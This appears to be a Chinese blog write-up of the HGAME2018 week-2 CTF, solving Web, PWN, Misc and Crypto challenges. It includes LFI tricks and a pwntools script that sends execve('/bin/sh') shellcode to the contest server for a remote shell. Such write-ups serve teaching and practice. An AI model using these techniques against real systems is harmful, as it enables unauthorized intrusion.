---
title: HGAME2018-week2部分WP
connments: true
tags:
  - CTF
  - Web
  - PWN
  - Misc
  - Crypto
categories: WriteUp
desc: HGAME2018-week2部分WP
abbrlink: 7371
date: 2018-02-16 16:00:20
summary:
---

菜鸟每天飞过

<!-- more -->，报告一下做题进度

-    Web
     - [x] Random?
     - [x] 草莓社区-1
     - [x] 草莓社区-2
     - [ ] XSS-1
     - [ ] XSS-2
     - [ ] 最简单的sql题
-    Rev
     - [ ] wtfitis
     - [ ] miaomiaowu
     - [ ] iccanobif
-    PWN
     - [x] ez_shellcode
     - [x] ez bash jail
     - [ ] hacker_system_ver1
     - [ ] ez_shellcode_ver2
-    Misc
     - [x] 咻咻咻
     - [x] White cosmos
     - [x] easy password
     - [x] mysterious file header
-    Crypto
     - [x] easy rsa
     - [x] the same simple RSA
     - [ ] xasr
     - [x] Caesar&&Caesar
     - [x] violence

所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……

# Web

## Random?

首先都提示了vim改代码，那就是源码泄露咯

试了一下是{% asset_img snipaste20180213_175026.png Random1 %}

用vim读一下{% asset_img snipaste20180213_175201.png Random2 %}

这里的方法是构造一个对象使public和secret公用空间，方法是{% asset_img snipaste20180213_180251.png Random3 %}

{% asset_img snipaste20180213_180245.png Random4 %}

## 草莓社区-1

LFI嘛，最简单的肯定是直接来咯

{% asset_img snipaste20180213_171633.png 草莓社区-1 %}

## 草莓社区-2

难一点的就用base64编码读咯

{% asset_img snipaste20180213_172618.png 草莓社区-2_1 %}

{% asset_img snipaste20180213_172626.png 草莓社区-2_2 %}

# PWN

## ez_shellcode

既然是直接执行，那找一个就好了

```python
from pwn import *
r = remote("111.230.149.72",10004)
print r.recv
payload = "\x6a\x0b"+"\x58"+"\x99"+"\x52"+"\x68\x2f\x2f\x73\x68"+"\x68\x2f\x62\x69\x6e"+"\x89\xe3"+"\x52" +"\x53"+"\x89\xe1"+"\xcd\x80"
r.send(payload)
r.interactive()
```

## ez bash jail

根据视频教程

{% asset_img snipaste20180214_171547.png ez bash jail %}

# Misc

## 咻咻咻

首先是一个zip伪加密{% asset_img snipaste20180211_211448.png 咻咻咻1 %}

解压出来以后按照https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码

{% asset_img snipaste20180212_203651.png 咻咻咻2 %}

明显是Base64，解码得flag

## White cosmos

PWNHUB密码学专场里的签到题的套路

打开一看0x09/0x20心里就有底了{% asset_img snipaste20180211_204814.png white cosmos1 %}

因为可见字符首位应该是0，所以0x09对应0，0x20对应1

{% asset_img snipaste20180211_205356.png white cosmos2 %}

## easy password

没什么好说的，跑就是了

{% asset_img snipaste20180211_210003.png easy password %}

## mysterious file header

首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行

{% asset_img snipaste20180211_222543.png mysterious file header1 %}

解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下

有用的代码为

```java
/*
 * Decompiled with CFR 0_123.
 */
package GUI;

import java.awt.Component;
import java.awt.GridLayout;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;

public class hgameGUI
        extends JFrame {
    private static final int DEFAULT_WIDTH = 300;
    private static final int DEFAULT_HEIGHT = 200;

    public hgameGUI() {
        super("Welcome to Hgame!");
        this.setSize(300, 200);
        JButton flag1 = new JButton("i'm flag");
        JButton flag2 = new JButton("i'm flag, too.");
        JButton flag3 = new JButton("RU kidding me? I'm the true flag!");
        JButton flag4 = new JButton("UR wrong, I'm the true flag!");
        JTextArea flagtext = new JTextArea("Want flag? Try upstairs.");
        JPanel flag = new JPanel();
        flag.setLayout(new GridLayout(5, 1));
        flag.add(flag1);
        flag.add(flag2);
        flag.add(flag3);
        flag.add(flag4);
        flag.add(flagtext);
        flag1.addActionListener(event -> {
                    flagtext.setText("118");
                }
        );
        flag2.addActionListener(event -> {
                    flagtext.setText("54");
                }
        );
        flag3.addActionListener(event -> {
                    flagtext.setText("29");
                }
        );
        flag4.addActionListener(event -> {
                    flagtext.setText("89");
                }
        );
        this.add(flag);
    }
}
```

智障的我反应了半天才明白这是IP地址

遍历一下顺序查一下，在中国的一个IP里找到

{% asset_img snipaste20180212_211411.png mysterious file header2 %}

{% asset_img snipaste20180212_211452.png mysterious file header3 %}

# Crypto

## easy rsa

明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ

``` python
N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
e = 65537
c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750

low = 1
high = h//2 
mid =int((low+high))//2

while low<high:
	if low*(h-low)  > N:
		high = mid-1
	else:
		low = mid + 1
	mid = (low+high)//2

print(low)
print(h-low)
```

这样就有p/q了

后来发现这出题人一开始应该没这样想

回头补……

## The same simple RSA

先读一下key咯

```bash
$ openssl rsa -pubin -in pubkey.pem -text -modulus
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 65537 (0x10001)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
yigb/+l/vjDdAgMBAAE=
-----END PUBLIC KEY-----
writing RSA key

```

256位嘛，好说了

{% asset_img snipaste20180212_150022.png The same simple RSA %}

然后用rsatool生成pem文件，解密得flag

需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过

## Caesar&&Caesar

直接在线解咯

要分析的话，就是指数重叠+频率分析？

## violence

```python
a = "191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105"
a = a.replace('_','')
str = ""
for i in range(0,int(len(a)/2)):
	str+=chr(ord('a')+int(a[2*i]+a[2*i+1],16))
print(str)
```

```python
from pycipher import Affine

s = [1,3,5,7,9,11,15,17,19,21,23,25]
for i in s:
	for j in range(0,25):
		print(Affine(a=i,b=j).encipher('zxjfghjfzhggdvfzdkhgxmuhxcfqrf').lower())
```

然后找到

{% asset_img snipaste20180211_220623.png violence %}